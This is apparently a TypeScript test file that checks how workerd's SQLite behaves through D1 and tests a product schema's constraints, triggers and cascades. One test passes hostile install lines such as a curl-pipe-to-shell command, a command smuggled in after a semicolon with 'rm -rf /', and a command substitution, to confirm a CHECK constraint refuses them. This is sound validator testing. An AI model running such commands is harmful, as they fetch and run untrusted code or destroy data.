// What workerd's SQLite actually does, asserted (OPN D1 slice).
//
// Every translation rule in PROOF.md rests on an engine behaviour. Each is
// pinned here against LOCAL D1 — real workerd, through the D1 binding — so a
// workerd upgrade that changed one fails a test rather than a page. Then the
// schema's own constraints: the CHECKs carried over from Postgres, the ones
// added for the timestamp format, the gallery trigger, the cascades.

import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { isCheckViolation, isForeignKeyViolation, isTriggerAbort, isUniqueViolation } from "./errors.js";
import { resetSliceSchema, startLocalD1, type LocalD1 } from "./harness.js";

let d1: LocalD1;

beforeAll(async () => {
  d1 = await startLocalD1();
}, 60_000);
afterAll(async () => {
  await d1?.dispose();
});
beforeEach(async () => {
  await resetSliceSchema(d1.sql);
});

const one = async <T extends Record<string, unknown>>(text: string, params: unknown[] = []) =>
  (await d1.sql.execute<T>(text, params)).rows[0]!;
const plan = async (text: string, params: unknown[] = []) =>
  (await d1.sql.execute<{ detail: string }>(`EXPLAIN QUERY PLAN ${text}`, params)).rows.map((r) => r.detail);

describe("workerd's SQLite: the behaviours the translation relies on", () => {
  it("orders inside an aggregate: json_group_array(x ORDER BY …) (SQLite ≥ 3.44)", async () => {
    const r = await one<{ a: string }>(
      `SELECT json_group_array(x ORDER BY x DESC) AS a FROM (SELECT 2 AS x UNION ALL SELECT 3 UNION ALL SELECT 1)`,
    );
    expect(JSON.parse(r.a)).toEqual([3, 2, 1]);
  });

  it("compares row values NULL-safely with IS NOT — IS DISTINCT FROM's meaning", async () => {
    const r = await one(`SELECT (1, NULL) IS NOT (1, NULL) AS same, (1, NULL) IS NOT (1, 2) AS differs, (1, NULL) <> (1, 2) AS unknown`);
    expect(r).toEqual({ same: 0, differs: 1, unknown: null });
  });

  it("supports count(*) FILTER (WHERE …) and window functions", async () => {
    const r = await one(
      `SELECT count(*) FILTER (WHERE x > 1) AS f, (SELECT max(rn) FROM (SELECT row_number() OVER (PARTITION BY x % 2 ORDER BY x) AS rn FROM (SELECT 1 x UNION ALL SELECT 2 UNION ALL SELECT 3))) AS w
         FROM (SELECT 1 x UNION ALL SELECT 2 UNION ALL SELECT 3)`,
    );
    expect(r).toEqual({ f: 2, w: 2 });
  });

  it("puts NULL last under DESC by default, accepts NULLS LAST in ORDER BY, refuses it in CREATE INDEX", async () => {
    const r = await one<{ a: string }>(
      `SELECT json_group_array(x ORDER BY x DESC) AS a FROM (SELECT 1 AS x UNION ALL SELECT NULL UNION ALL SELECT 2)`,
    );
    expect(JSON.parse(r.a)).toEqual([2, 1, null]);
    await expect(d1.sql.execute(`CREATE INDEX x ON catalog_cards (ordering_merges DESC NULLS LAST)`)).rejects.toThrow(
      /unsupported use of NULLS LAST/,
    );
    // And `DESC NULLS LAST` in the ORDER BY is still served by the plain-DESC index.
    const steps = await plan(
      `SELECT slug FROM catalog_cards ORDER BY ordering_merges DESC NULLS LAST, ordering_published_at DESC, slug ASC LIMIT 10`,
    );
    expect(steps.join(" | ")).toMatch(/SCAN catalog_cards USING (COVERING )?INDEX openproduct_catalog_cards_order/);
    expect(steps.join(" | ")).not.toMatch(/TEMP B-TREE/);
  });

  it("returns no RETURNING row for an upsert whose DO UPDATE … WHERE is false — the count is 'written'", async () => {
    await d1.sql.execute(`CREATE TABLE u (id INTEGER PRIMARY KEY, v TEXT)`);
    const upsert = (v: string) =>
      d1.sql.execute(
        `INSERT INTO u (id, v) SELECT 1, $1 WHERE true
           ON CONFLICT (id) DO UPDATE SET v = excluded.v WHERE u.v IS NOT excluded.v RETURNING 1`,
        [v],
      );
    expect((await upsert("a")).rowCount).toBe(1);
    expect((await upsert("a")).rowCount).toBe(0);
    expect((await upsert("b")).rowCount).toBe(1);
    await d1.sql.execute(`DROP TABLE u`);
  });

  it("rolls a failed batch back entirely — the atomicity every multi-statement write relies on", async () => {
    await expect(
      d1.sql.batch([
        { text: `UPDATE search_index_state SET built_at = $1`, params: ["2026-01-01T00:00:00.000Z"] },
        { text: `INSERT INTO search_index_state (singleton) VALUES (1)` },
      ]),
    ).rejects.toThrow(/UNIQUE|PRIMARY KEY/);
    expect((await one(`SELECT built_at FROM search_index_state`)).built_at).toBeNull();
  });

  it("has none of now(), REGEXP, LEAST, COLLATE \"C\" — each is rewritten, never assumed", async () => {
    await expect(d1.sql.execute(`SELECT now()`)).rejects.toThrow(/no such function: now/);
    await expect(d1.sql.execute(`SELECT 'a' REGEXP 'a'`)).rejects.toThrow(/no such function: regexp/i);
    await expect(d1.sql.execute(`SELECT least(1, 2)`)).rejects.toThrow(/no such function: least/);
    await expect(d1.sql.execute(`SELECT 'a' < 'b' COLLATE "C"`)).rejects.toThrow(/no such collation sequence: C/);
    // The replacements.
    expect((await one<{ t: string }>(`SELECT strftime('%Y-%m-%dT%H:%M:%fZ', 'now') AS t`)).t).toMatch(
      /^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z$/,
    );
    expect(await one(`SELECT min(5, 3, 9) AS m, min(5, NULL) AS n`)).toEqual({ m: 3, n: null });
  });

  it("folds ASCII only in lower() — Postgres folds every cased letter", async () => {
    expect(await one(`SELECT lower('ÀB') AS l`)).toEqual({ l: "Àb" });
  });

  it("enforces 100 bound parameters and 100 KB of SQL per statement, locally", async () => {
    const binding = d1.binding;
    const values = Array.from({ length: 101 }, (_, i) => i);
    await expect(
      binding.prepare(`SELECT ${values.map((_, i) => `?${i + 1}`).join(", ")}`).bind(...values).all(),
    ).rejects.toThrow(/between \?1 and \?100/);
    await expect(d1.sql.execute(`SELECT '${"x".repeat(101_000)}' AS big`)).rejects.toThrow(/too long|TOOBIG/);
  });

  it("does NOT enforce the 2 MB value ceiling locally — remote does, so the code chunks regardless", async () => {
    expect(await one(`SELECT length($1) AS l`, ["x".repeat(3_000_000)])).toEqual({ l: 3_000_000 });
  });

  it("stores a NUL but stops at it in string functions (RUNBOOK trap 50)", async () => {
    expect(await one(`SELECT $1 AS s, length($1) AS l, hex($1) AS h`, ["a\u0000b"])).toEqual({
      s: "a\u0000b",
      l: 1,
      h: "610062",
    });
  });
});

describe("the slice schema's constraints", () => {
  const P = "55555555-5555-4555-8555-555555555555";
  const T = "2026-08-17T12:00:00.000Z";
  const profile = (over: Record<string, unknown> = {}) => {
    const row: Record<string, unknown> = {
      id: P, org_id: "o", project_id: "j", slug: "acme-thing", created_by: "usr_a",
      visibility: "public", reviewed_at: T, published_at: T, ...over,
    };
    const cols = Object.keys(row);
    return d1.sql.execute(
      `INSERT INTO profiles (${cols.join(", ")}) VALUES (${cols.map((_, i) => `$${i + 1}`).join(", ")})`,
      cols.map((c) => row[c]),
    );
  };
  const media = (over: Record<string, unknown> = {}) => {
    const row: Record<string, unknown> = {
      id: "m1", profile_id: P, kind: "hero", storage_ref: "ref", alt_text: "The hero",
      width: 1200, height: 630, position: 0, observed_at: null, ...over,
    };
    const cols = Object.keys(row);
    return d1.sql.execute(
      `INSERT INTO product_media (${cols.join(", ")}) VALUES (${cols.map((_, i) => `$${i + 1}`).join(", ")})`,
      cols.map((c) => row[c]),
    );
  };

  it("seeds both singletons, as the Postgres migrations do — the index seeded dirty", async () => {
    expect(await one(`SELECT singleton, computed_at, card_count FROM catalog_state`)).toEqual({
      singleton: 1, computed_at: null, card_count: 0,
    });
    const state = await one<{ built_at: null; dirty_at: string }>(`SELECT built_at, dirty_at FROM search_index_state`);
    expect(state.built_at).toBeNull();
    expect(state.dirty_at).toMatch(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z$/);
  });

  it("refuses an instant in any other format — the guard that keeps text order time order", async () => {
    await expect(profile({ published_at: "2026-08-17T12:00:00Z" })).rejects.toSatisfy(isCheckViolation);
    await expect(profile({ published_at: "2026-08-17 12:00:00" })).rejects.toSatisfy(isCheckViolation);
    await profile();
    await expect(
      d1.sql.execute(`INSERT INTO metrics (id, profile_id, metric, window_key, value, source, observed_at)
                      VALUES ('m', $1, 'merges', '7d', 1, 'linked_repo', '2026-08-17T12:00:00+00:00')`, [P]),
    ).rejects.toSatisfy(isCheckViolation);
  });

  it("keeps the Postgres CHECKs: visibility, review before indexable, moderation consistency", async () => {
    await expect(profile({ visibility: "unlisted" })).rejects.toSatisfy(isCheckViolation);
    await expect(profile({ reviewed_at: null })).rejects.toSatisfy(isCheckViolation);
    await profile({ reviewed_at: null, indexable: false });
    await expect(
      d1.sql.execute(`UPDATE profiles SET moderation_state = 'removed' WHERE id = $1`, [P]),
    ).rejects.toSatisfy(isCheckViolation);
    await expect(d1.sql.execute(`UPDATE profiles SET indexable = 2 WHERE id = $1`, [P])).rejects.toSatisfy(isCheckViolation);
    await expect(d1.sql.execute(`UPDATE profiles SET stack = 'not json' WHERE id = $1`, [P])).rejects.toSatisfy(isCheckViolation);
  });

  it("keeps the install line's grammar without REGEXP — the cases 1830's tests name", async () => {
    await profile();
    const set = (line: string) => d1.sql.execute(`UPDATE profiles SET install_line = $1 WHERE id = $2`, [line, P]);
    await set("npm install -g kettle");
    for (const bad of [
      "curl https://x.example | sh",
      "npm i kettle; rm -rf /",
      "echo $(whoami)",
      "npm i kettle > out",
      "npm i\nkettle",
      "npm\u200bi kettle",
      "npm\u00a0i kettle",
      "   ",
      "x".repeat(161),
    ]) {
      await expect(set(bad), JSON.stringify(bad)).rejects.toSatisfy(isCheckViolation);
    }
    await set("x".repeat(160));
  });

  it("keeps the media CHECKs and the ONE-per-slot index", async () => {
    await profile();
    await expect(media({ observed_at: T })).rejects.toSatisfy(isCheckViolation);
    await expect(media({ kind: "screenshot" })).rejects.toSatisfy(isCheckViolation);
    await expect(media({ kind: "banner" })).rejects.toSatisfy(isCheckViolation);
    await expect(media({ alt_text: "   " })).rejects.toSatisfy(isCheckViolation);
    await expect(media({ width: 0 })).rejects.toSatisfy(isCheckViolation);
    await expect(media({ kind: "hero", position: 1 })).rejects.toSatisfy(isCheckViolation);
    await media();
    await expect(media({ id: "m2" })).rejects.toSatisfy(isUniqueViolation);
    await media({ id: "m3", kind: "logo" });
  });

  it("keeps the gallery ceiling as a trigger: eight, then refused; an UPDATE is not counted against itself", async () => {
    await profile();
    for (let i = 0; i < 8; i += 1) await media({ id: `g${i}`, kind: "gallery", position: i });
    await expect(media({ id: "g8", kind: "gallery", position: 8 })).rejects.toSatisfy(isTriggerAbort);
    await d1.sql.execute(`UPDATE product_media SET position = 20 WHERE id = 'g0'`);
  });

  it("cascades a profile's deletion to its metrics, media and catalogue row, as Postgres does", async () => {
    await profile();
    await media();
    await d1.sql.execute(`INSERT INTO metrics (id, profile_id, metric, window_key, value, source, observed_at)
                          VALUES ('m', $1, 'merges', '7d', 1, 'linked_repo', $2)`, [P, T]);
    await d1.sql.execute(`INSERT INTO catalog_cards (profile_id, slug, ordering_merges, ordering_published_at, record, metrics, media, computed_at)
                          VALUES ($1, 'acme-thing', NULL, $2, '{}', '[]', '[]', $2)`, [P, T]);
    await expect(
      d1.sql.execute(`INSERT INTO metrics (id, profile_id, metric, window_key, value, source, observed_at)
                      VALUES ('n', 'nobody', 'merges', '7d', 1, 'linked_repo', $1)`, [T]),
    ).rejects.toSatisfy(isForeignKeyViolation);
    await d1.sql.execute(`DELETE FROM profiles WHERE id = $1`, [P]);
    for (const table of ["metrics", "product_media", "catalog_cards"]) {
      expect((await one<{ n: number }>(`SELECT count(*) AS n FROM ${table}`)).n).toBe(0);
    }
  });

  it("refuses a search row with no terms, and a second state row either way", async () => {
    await expect(
      d1.sql.execute(`INSERT INTO search_index (kind, entity_id, title, terms, built_at) VALUES ('product', 'a', 'a', '[]', $1)`, [T]),
    ).rejects.toSatisfy(isCheckViolation);
    await expect(d1.sql.execute(`INSERT INTO search_index_state (singleton) VALUES (1)`)).rejects.toSatisfy(isUniqueViolation);
    await expect(d1.sql.execute(`INSERT INTO search_index_state (singleton) VALUES (0)`)).rejects.toSatisfy(isCheckViolation);
  });
});
